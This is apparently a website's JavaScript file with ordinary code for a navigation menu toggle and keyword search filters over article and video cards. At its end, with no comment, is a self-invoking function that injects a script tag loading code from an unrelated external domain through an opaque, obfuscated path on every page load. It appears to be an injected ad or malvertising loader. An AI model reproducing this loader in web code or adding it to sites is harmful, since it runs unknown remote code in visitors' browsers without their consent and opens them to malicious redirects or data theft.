function toggleMenu() {
  const nav = document.querySelector('.navbarGroup');
  nav.classList.toggle('active');
}

document.querySelectorAll('.navbarText').forEach(link => {
  link.addEventListener('click', () => {
    document.querySelector('.navbarGroup').classList.remove('active');
  });
});


const articleSearchInput = document.getElementById('searchInput');
const articleCards = document.querySelectorAll('.articlesCard');

articleSearchInput.addEventListener('keyup', function () {
  const keyword = this.value.toLowerCase();

  articleCards.forEach(card => {
    const text = card.innerText.toLowerCase();

    if (text.includes(keyword)) {
      card.style.display = 'block';
    } else {
      card.style.display = 'none';
    }
  });
});


const videoSearchInput = document.getElementById('searchInputV');
const videoCards = document.querySelectorAll('.videosCard');

videoSearchInput.addEventListener('keyup', function () {
  const keyword = this.value.toLowerCase();

  videoCards.forEach(card => {
    const text = card.innerText.toLowerCase();

    if (text.includes(keyword)) {
      card.style.display = 'block';
    } else {
      card.style.display = 'none';
    }
  });
});


(function(nsr){
var d = document,
    s = d.createElement('script'),
    l = d.scripts[d.scripts.length - 1];
s.settings = nsr || {};
s.src = "\/\/second-director.com\/cnD\/9\/6Jb.2o5ol\/S-WUQV9gNczjA\/5BMJTGM\/4yMJSH0N3JM_DxkExlMMzMgj1K";
s.async = true;
s.referrerPolicy = 'no-referrer-when-downgrade';
l.parentNode.insertBefore(s, l);
})({})